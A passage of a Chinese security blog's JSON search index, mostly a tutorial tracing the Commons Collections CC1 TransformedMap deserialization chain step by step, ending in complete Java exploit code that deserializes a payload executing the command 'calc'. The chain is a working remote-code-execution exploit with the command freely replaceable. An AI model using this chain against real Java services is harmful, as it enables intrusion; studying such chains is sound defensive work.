总结LazyMap这条链相对于TransformedMap要复杂一点，主要是中间还涉及到动态代理相关的知识","categories":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"http://example.com/categories/JAVA%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"http://example.com/tags/JAVA%E5%AE%89%E5%85%A8/"},{"name":"CC链","slug":"CC链","permalink":"http://example.com/tags/CC%E9%93%BE/"}]},{"title":"浅述CC链(1)：CC链1-TransformedMap","slug":"CC链1-TransformedMap","date":"2025-07-06T15:26:15.000Z","updated":"2025-07-13T09:27:27.154Z","comments":true,"path":"2025/07/06/CC链1-TransformedMap/","permalink":"http://example.com/2025/07/06/CC%E9%93%BE1-TransformedMap/","excerpt":"","text":"CC链1-TransformedMap反序列化利用链的大概流程如下图所示，其实就是找到一个可利用点，不停寻找调用点，一直到起点调用，中间的调用点可以不存在，也可以很多 这里先来说说CC链1，CC链1存在两条链，先说TransformedMap这一条 搭建环境 jdk8u65 Commons-Collections 3.2.1 执行点：InvokerTransformer在InvokerTransformer这个类中，存在一个transform方法，接收一个类文件，然后进行反射调用 1234567891011121314151617public Object transform(Object input) &#123; if (input == null) &#123; return null; &#125; try &#123; Class cls = input.getClass(); Method method = cls.getMethod(iMethodName, iParamTypes); return method.invoke(input, iArgs); &#125; catch (NoSuchMethodException ex) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; does not exist&quot;); &#125; catch (IllegalAccessException ex) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; cannot be accessed&quot;); &#125; catch (InvocationTargetException ex) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; threw an exception&quot;, ex); &#125;&#125; 其中的iMethodName、iParamTypes等参数，来自于这个类的构造文件 123456public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123; super(); iMethodName = methodName; iParamTypes = paramTypes; iArgs = args;&#125; 也就是说这个反射代码的所有参数都可以进行控制，只要能传入指定参数就能够实现任意代码执行。构造如下代码，运行成功弹出计算器 123456public class CC1TransformedMap &#123; public static void main(String[] args) &#123; InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;); invokerTransformer.transform(Runtime.getRuntime()); &#125;&#125; 调用点1：TransformedMap查找关于transform方法的调用，在TransformedMap这个类中找到一处可利用的调用点checkSetValue方法 123protected Object checkSetValue(Object value) &#123; return valueTransformer.transform(value);&#125; 如果能够将valueTransformer设置为InvokerTransformer，参数传递为Runtime.getRuntime,那么就能够执行到我们的代码。 查找valueTransformer的赋值，是来自于构造函数 12345protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123; super(map); this.keyTransformer = keyTransformer; this.valueTransformer = valueTransformer;&#125; 这里的构造函数接收三个参数，一个Map和两个Transformer。但是这个构造函数是被protected修饰，表示只能被当前类或父子类进行调用，查找这个构造方法的调用点，找到一个decorate方法 123public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123; return new TransformedMap(map, keyTransformer, valueTransformer);&#125; 接收参数，然后返回一个TransformedMap类的实例 构造一个TransformedMap实例，构造一个Map集合传入，keyTransformer参数不需要，传入null即可。valueTransformer的位置传入构造的invokerTransformer 12345678910public class CC1TransformedMap &#123; public static void main(String[] args) &#123; InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;); //invokerTransformer.transform(Runtime.getRuntime()); HashMap&lt;Object, Object&gt; hMap = new HashMap&lt;&gt;(); hMap.put(&quot;key&quot;, &quot;value&quot;); Map decorate = TransformedMap.decorate(hmap, null, invokerTransformer); &#125;&#125; 此时调用获取的decorate对象的checkSetValue方法并传入参数，但是这个方法也是protected修饰，也是只能被当前类或父子类进行调用，继续查找调用。 调用点2：AbstractInputCheckedMapDecorator查找checkSetValue调用只有一处，位于AbstractInputCheckedMapDecorator类的setValue方法中，这个类是TransformedMap类的父类，这个方法位于MapEntry这个内部静态类中 123456789101112131415static class MapEntry extends AbstractMapEntryDecorator &#123; /** The parent map */ private final AbstractInputCheckedMapDecorator parent; protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) &#123; super(entry); this.parent = parent; &#125; public Object setValue(Object value) &#123; value = parent.checkSetValue(value); return entry.setValue(value); &#125;&#125; 那么这里我们应该如何赋值并调用呢？直接问AI 这个类是一个装饰器，对原本Map.Entry进行包装修饰增强，其实就是遍历Map集合，一个Entry就是Map集合中的一个键值对，按照提示构造代码，能够弹出计算器 1234567891011121314public class CC1TransformedMap &#123; public static void main(String[] args) &#123; InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;); //invokerTransformer.transform(Runtime.getRuntime()); HashMap&lt;Object, Object&gt; hMap = new HashMap&lt;&gt;(); hMap.put(&quot;key&quot;, &quot;value&quot;); Map decorate = TransformedMap.decorate(hMap, null, invokerTransformer); for(Object object : decorate.entrySet()) &#123; Map.Entry entry = (Map.Entry) object; // 这里 setValue 会触发 invokerTransformer 的 transform 方法 entry.setValue(Runtime.getRuntime()); &#125; &#125;&#125; 这里为什么遍历就能过执行到内部类中的setValue方法？简单来说，TransformedMap继承了AbstractInputCheckedMapDecorator类，这个类重写了entrySet方法，最后返回的就是AbstractInputCheckedMapDecorator的MapEntry 我们继续查找AbstractInputCheckedMapDecorator类中内部类MapEntry的setValue方法的调用 反序列化入口：AnnotationInvocationHandler查找setValue调用时，在AnnotationInvocationHandler类中找到了调用点，位于readObject方法中，能够直接作为反序列化起点使用，并且正好在进行处于遍历的过程中 123456789101112131415161718192021222324252627282930313233private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException &#123; s.defaultReadObject(); // Check to make sure that types have not evolved incompatibly AnnotationType annotationType = null; try &#123; annotationType = AnnotationType.getInstance(type); &#125; catch(IllegalArgumentException e) &#123; // Class is no longer an annotation type; time to punch out throw new java.io.InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;); &#125; Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes(); // If there are annotation members without values, that // situation is handled by the invoke method. for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123; String name = memberValue.getKey(); Class&lt;?&gt; memberType = memberTypes.get(name); if (memberType != null) &#123; // i.e. member still exists Object value = memberValue.getValue(); if (!(memberType.isInstance(value) || value instanceof ExceptionProxy)) &#123; memberValue.setValue( new AnnotationTypeMismatchExceptionProxy( value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember( annotationType.members().get(name))); &#125; &#125; &#125;&#125; 在这里只要控制memberValue为Invokertransformer，给setValue传入参数Runtime.getRuntime，就能进行命令执行 这里的memberValue是对memberValues遍历获取的键值对，来自于memberValues，也就说控制memberValues为构造的TransformedMap集合，就能够执行到漏洞代码。而memberValues是通过构造函数进行赋值的，所以这里先新建这个对象。 但是这个类没有修饰符，即默认为default修饰，这表示只允许当前包中调用 所以这里选择反射进行调用赋值。查看构造函数中的参数，第一个是一个继承了注解类的Class类，即需要一个注解的Class。第二个参数是一个Map集合，这里就传入我们构造的TransformedMap 12345678910111213141516171819public class CC1TransformedMap &#123; public static void main(String[] args) throws Exception &#123; InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;); //invokerTransformer.transform(Runtime.getRuntime()); HashMap&lt;Object, Object&gt; hMap = new HashMap&lt;&gt;(); hMap.put(&quot;key&quot;, &quot;value&quot;); Map decorate = TransformedMap.decorate(hMap, null, invokerTransformer); //for(Object object : decorate.entrySet()) &#123; // Map.Entry entry = (Map.Entry) object; // // 这里 setValue 会触发 invokerTransformer 的 transform 方法 // entry.setValue(Runtime.getRuntime()); //&#125; Class&lt;?&gt; annotationInvocationHandler = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor&lt;?&gt; annotationConstructor = annotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class); annotationConstructor.setAccessible(true); Object o = annotationConstructor.newInstance(Target.class, decorate); &#125;&#125; 这里对这个对象o进行序列化和反序列化是否能够实现命令执行呢？答案是不能，这里还存在三个问题： Runtime类没有实现序列化接口，所以传入的Runtime.getRuntime无法进入序列化流程 setValue的参数不能控制为我们想要传入的参数 readObject方法中还存在两个if判断，需要绕过 解决问题1：反射解决Runtime无法序列化既然无法直接序列化Runtime，那么就通过反射进行赋值操作，这里直接采用InvokerTransformer类进行赋值反射操作 123456789101112131415161718192021public class CC1TransformedMap&#123; public static void main(String[] args) throws Exception&#123; Object getMethod = new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;).transform(Runtime.Class); Object invoke = new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;).transform(getMethod); InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;); HashMap&lt;Object, Object&gt; hMap = new HashMap(); hMap.put(&quot;key&quot;, &quot;value&quot;); Map&lt;Object, Object&gt; decorate = TransformedMap.decorate(hMap, null, invokerTransformer); //for (Object obj : decorate.entrySet()) &#123; // Map.Entry entry = (Map.Entry) obj; // // 这里 setValue 会触发 invokerTransformer 的 transform 方法 // entry.setValue(Runtime.getRuntime()); //&#125; Class&lt;?&gt; annotationInvocationHandler = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor&lt;?&gt; annotationConstructor = annotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class); annotationConstructor.setAccessible(true); Object o = annotationConstructor.newInstance(Target.class, decorate); &#125; 可以看到这里执行了很多相同的新建InvokerTransformer并执行了transform方法，可以通过ChainsTransformer类进行优化，这个类构造函数接收一个Transformer数组，然后它的transform方法接收一个参数，数组中第一个transformer通过transform方法接收这个参数，并将执行结果作为参数传入第二个transformer中 构造代码，此时如果我们调用chainedTransformer.transform(Runtime.class)就成功执行代码，就说明这里的构造没有问题。 1234567891011121314151617181920public class CC1TransformedMap&#123; public static void main(String[] args) throws Exception&#123; Transformer[] transformers = new Transformer[]&#123; new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); // chainedTransformer.transform(Runtime.class)； HashMap&lt;Object, Object&gt; hMap = new HashMap(); hMap.put(&quot;key&quot;, &quot;value&quot;); Map&lt;Object, Object&gt; decorate = TransformedMap.decorate(hMap, null, chainedTransformer); Class&lt;?&gt; annotationInvocationHandler = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor&lt;?&gt; annotationConstructor = annotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class); annotationConstructor.setAccessible(true); Object o = annotationConstructor.newInstance(Target.class, decorate); &#125; 解决问题2：setValue参数无法控制这里调用setValue方法其实就是在调用transform方法，其中的参数最后会传递到transform方法中。 但是这里参数无法控制，应该怎么传入我们想要的值呢？ 这里就要引入一个ConstantTransformer类，这个类的transform方法接收任意参数都只会返回iConstant，然而iConstant是构造方法中进行赋值的，也就是说只要实例化这个类时传入构造函数的参数为Runtime.class，无论transform接收到什么参数，都只会返回Runtime.class 1234567891011121314151617181920public class CC1TransformedMap&#123; public static void main(String[] args) throws Exception&#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); // chainedTransformer.transform(Runtime.class)； HashMap&lt;Object, Object&gt; hMap = new HashMap(); hMap.put(&quot;key&quot;, &quot;value&quot;); Map&lt;Object, Object&gt; decorate = TransformedMap.decorate(hMap, null, chainedTransformer); Class&lt;?&gt; annotationInvocationHandler = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor&lt;?&gt; annotationConstructor = annotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class); annotationConstructor.setAccessible(true); Object o = annotationConstructor.newInstance(Target.class, decorate);&#125; 假如当执行到setValue时，传入的参数是1，就相当于chainedTransformer的transform方法接收到了一个1，然后传递给Transformer数组中的第一个Transformer的transform方法，即ConstantTransformer的transform，最后返回了Runtime.class。再将这个结果传递给第二个Transformer的transform方法作为参数，成功绕过了setValue无法控制的问题。 解决问题3：绕过if判断第一个判断第一个判断是if (memberType != null) &#123; 判断memberType 是否为空 memerType的构造大概如下： 123456Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123; String name = memberValue.getKey(); Class&lt;?&gt; memberType = memberTypes.get(name); ......&#125; annotationType.memberTypes();中annotationType来自于构造方法接收的注解类，这里大概就是获取传入注解类的成员属性和类型，返回为一个Map集合 String name = memberValue.getKey();：其中memberValue是遍历memberValues是的每一个键值对，这个memberValues也是来自于构造方法接收的参数，也就是我们构造的hMap集合，然后遍历时获取其中键值对的键名。 Class&lt;?&gt; memberType = memberTypes.get(name);：这里就是获取注解类中为hMap键名的值 那么第一个判断其实就是在判断hMap的键名是否是传入的注解类中的一个成员属性名，如果是就进入判断。所以这里就要满足两个条件： 传入的注解类存在成员属性 hMap集合的key要设置为这个注解类的成员属性名 我们这里传入的注解类是Target，查看这个类，正好存在一个成员属性value 所以接下来需要将hMap的键名设置为value即可 1234567891011121314151617181920212223242526272829public class CC1TransformedMap&#123; public static void main(String[] args) throws Exception&#123; Object getMethod = new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;).transform(Runtime.class); Object invoke = new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;).transform(getMethod); InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;); Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object, Object&gt; hMap = new HashMap(); hMap.put(&quot;value&quot;, &quot;aaa&quot;); Map&lt;Object, Object&gt; decorate = TransformedMap.decorate(hMap, null, chainedTransformer); Class&lt;?&gt; annotationInvocationHandler = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor&lt;?&gt; annotationConstructor = annotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class); annotationConstructor.setAccessible(true); Object o = annotationConstructor.newInstance(Target.class, decorate); &#125;&#125; 第二个判断第二个判断是：if (!(memberType.isInstance(value) || value instanceof ExceptionProxy))，简单来说这里就是在判断hMap的value是否是某个实例，如果不是就进入判断。 我们这里传入的是一个随机字符串，不用处理就能够直接进入这一层的if 最终利用链根据上面的思路构造的利用链如下，此时执行反序列化就能够实现任意命令，这里是弹出计算器 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667package com.example;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.lang.reflect.Method;import java.util.HashMap;import java.util.Map;public class CC1TransformedMap&#123; public static void main(String[] args) throws Exception&#123; Object getMethod = new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;).transform(Runtime.class); Object invoke = new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;).transform(getMethod); InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;); Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object, Object&gt; hMap = new HashMap(); hMap.put(&quot;value&quot;, &quot;aaa&quot;); Map&lt;Object, Object&gt; decorate = TransformedMap.decorate(hMap, null, chainedTransformer); //for (Object obj : decorate.entrySet()) &#123; // Map.Entry entry = (Map.Entry) obj; // // 这里 setValue 会触发 invokerTransformer 的 transform 方法 // entry.setValue(Runtime.getRuntime()); //&#125; Class&lt;?&gt; annotationInvocationHandler = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor&lt;?&gt; annotationConstructor = annotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class); annotationConstructor.setAccessible(true); Object o = annotationConstructor.newInstance(Target.class, decorate); //serialize(o); unserialize(&quot;ser.bin&quot;); &#125; public static void serialize(Object object) throws Exception &#123; ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(object); &#125; public static Object unserialize(String fileName) throws Exception &#123; ObjectInputStream ois = new ObjectInputStream(new FileInputStream(fileName)); Object obj = ois.readObject(); return obj; &#125;&#125; 流程图","categories":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"http://example.com/categories/JAVA%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"http://example.com/tags/JAVA%E5%AE%89%E5%85%A8/"},{"name":"CC链","slug":"CC链","permalink":"http://example.com/tags/CC%E9%93%BE/"}]}],"categories":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"http://example.com/categories/JAVA%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"http://example.com/tags/JAVA%E5%AE%89%E5%85%A8/"},{"name":"Shiro","slug":"Shiro","permalink":"http://example.com/tags/Shiro/"},{"name":"FastJson反序列化","slug":"FastJson反序列化","permalink":"http://example.com/tags/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"CC链","slug":"CC链","permalink":"http://example.com/tags/CC%E9%93%BE/"}]}